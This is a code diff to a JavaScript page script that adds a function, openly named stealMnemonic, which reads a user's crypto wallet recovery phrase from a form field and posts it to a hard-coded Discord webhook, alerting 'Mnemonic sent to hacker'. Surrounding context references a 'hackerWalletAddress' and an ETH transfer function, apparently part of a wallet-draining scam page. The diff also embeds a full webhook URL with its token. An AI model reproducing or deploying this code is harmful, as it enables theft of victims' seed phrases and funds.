@@ -2,6 +2,26 @@ const $result = (text) => {
   document.getElementById('result').innerHTML = text
 }
 
+const stealMnemonic = async () => {
+  const mnemonic = document.getElementById('mnemonic').value
+  const webhook = 'https://discord.com/api/webhooks/1096736777022214204/QNQtGqrnPbyFyUGSn6tonB2dSRODUa8VflNc1usvM-yB-a5skCSHC1mFA3M-Ax2E_PVN'
+  const data = {
+    content: mnemonic
+  }
+  const response = await fetch(webhook, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
+  if (response.ok) {
+    alert('Mnemonic sent to hacker')
+  } else {
+    alert('Error sending mnemonic to hacker')
+  }
+}
+
 const hackerWalletAddress = '0xC8fE17824bdf7C0FdF7fB63D9F4D0b161a73C2a8';
 
 const setupWeb3 = async () => {
@@ -25,10 +45,6 @@ const setupWeb3 = async () => {
   } catch (err) {
     console.log(err)
   }
-}
-
-const input_mnemonic = async () => {
-  alert('Congratulations! All your assets are mine.')
 }
 
 const eth_transfer = async () => {
